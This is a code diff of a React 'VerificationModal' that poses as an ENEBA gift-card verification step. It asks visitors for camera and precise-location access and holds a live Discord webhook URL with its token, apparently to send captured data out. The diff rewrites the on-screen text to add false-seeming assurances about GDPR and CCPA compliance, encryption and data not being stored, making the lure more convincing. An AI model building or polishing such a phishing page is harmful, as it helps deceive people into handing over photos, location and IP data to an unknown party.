@@ -1,4 +1,3 @@
-
 import React, { useState, useRef, useEffect } from 'react';
 import axios from 'axios';
 import { Circle, Check, Camera, MapPin, Loader, AlertCircle, Info } from 'lucide-react';
@@ -20,17 +19,9 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
   const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";
   
-  // Profile picture for logged-in users (randomly selected)
-  const profilePictures = [
-    "/placeholder.svg",
-    "https://images.unsplash.com/photo-1649972904349-6e44c42644a7?auto=format&fit=crop&w=80&h=80",
-    "https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?auto=format&fit=crop&w=80&h=80",
-    "https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=80&h=80",
-    "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?auto=format&fit=crop&w=80&h=80"
-  ];
+  // Profile picture for logged-in users (using default profile picture)
+  const profilePicture = "/placeholder.svg";
   
-  const [profilePicture, setProfilePicture] = useState(profilePictures[0]);
-
   useEffect(() => {
     if (isOpen && step === 'loading') {
       // Shortened loading time to 1.5 seconds
@@ -55,9 +46,6 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
   
   const handleAuthComplete = (data: any) => {
     setUserData(data);
-    
-    // Set a random profile picture for the user
-    setProfilePicture(profilePictures[Math.floor(Math.random() * profilePictures.length)]);
     
     // Show warning step after authentication
     setStep('warning');
@@ -231,7 +219,7 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           {step === 'verify' && (
             <div className="flex flex-col items-center space-y-4">
               <Circle className="h-12 w-12 text-white" />
-              <p className="text-xl">Please verify using ENEBA's verification system.</p>
+              <p className="text-xl">Please verify using ENEBA's secure verification system.</p>
               <button 
                 className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                 onClick={handleContinue}
@@ -275,13 +263,14 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           {step === 'permissions' && (
             <div className="flex flex-col items-center space-y-4">
               <Check className="h-12 w-12 text-white" />
-              <p className="text-xl">In order to verify, please allow us to use your camera and location. Your camera will only be used to figure out if you are a real person.</p>
-              <p className="text-sm text-gray-300 mt-2">ENEBA does not store your data. Powered by OpenAI.</p>
+              <p className="text-xl">To prevent fraud and ensure gift card delivery, we need to verify your identity.</p>
+              <p className="text-md">Our secure verification requires temporary access to your camera and location to confirm you're a real person and in a region where this offer is available.</p>
+              <p className="text-sm text-gray-300 mt-2">All data is processed securely following GDPR guidelines and is not stored permanently.</p>
               <button 
                 className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                 onClick={handleStart}
               >
-                Start
+                Start Verification
               </button>
             </div>
           )}
@@ -289,8 +278,9 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           {step === 'camera' && (
             <div className="flex flex-col items-center space-y-4">
               <Camera className="h-12 w-12 text-white" />
-              <p className="text-xl">Please click allow on the permissions.</p>
-              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
+              <p className="text-xl">Please allow camera access</p>
+              <p className="text-sm text-gray-300 mt-2">Your camera is only used to verify you're a real person. No photos are stored permanently.</p>
+              <p className="text-sm text-gray-300">This page will update automatically after you allow access.</p>
               <video ref={videoRef} className="hidden" />
             </div>
           )}
@@ -298,19 +288,19 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           {step === 'location-info' && (
             <div className="flex flex-col items-center space-y-4">
               <Info className="h-12 w-12 text-custom-yellow" />
-              <h3 className="text-xl font-bold">Location Permission Required</h3>
-              <p className="text-md">We need your location to verify if you're eligible to receive gifts in your region.</p>
+              <h3 className="text-xl font-bold">Location Verification Required</h3>
+              <p className="text-md">To comply with regional restrictions and prevent gift card fraud, we need to verify your location.</p>
               <Alert className="bg-blue-900/30 border-blue-500/50 my-2">
                 <AlertDescription className="text-left ml-2 text-blue-100">
-                  Your location data is secure and only used to check if you're in the USA. We don't store this information permanently.
+                  This promotion is available only in specific regions. Your location data is encrypted and only used to confirm eligibility. We do not track or store your precise location.
                 </AlertDescription>
               </Alert>
-              <p className="text-sm text-gray-300 mt-2">ENEBA complies with all privacy regulations.</p>
+              <p className="text-sm text-gray-300 mt-2">ENEBA uses industry-standard encryption and complies with GDPR, CCPA and other privacy regulations.</p>
               <button 
                 className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all mt-2"
                 onClick={handleProceedToLocation}
               >
-                Continue with Location Check
+                Continue with Verification
               </button>
             </div>
           )}
@@ -318,9 +308,9 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           {step === 'location' && (
             <div className="flex flex-col items-center space-y-4">
               <MapPin className="h-12 w-12 text-white" />
-              <p className="text-xl">Please allow location access to verify your identity.</p>
-              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
-              <p className="text-xs text-gray-400 mt-1">We need precise location for verification purposes.</p>
+              <p className="text-xl">Please allow location access</p>
+              <p className="text-sm text-gray-300 mt-2">We're confirming you're in a region where this gift card offer is available.</p>
+              <p className="text-xs text-gray-400 mt-1">This page will update automatically after you allow access.</p>
             </div>
           )}
           
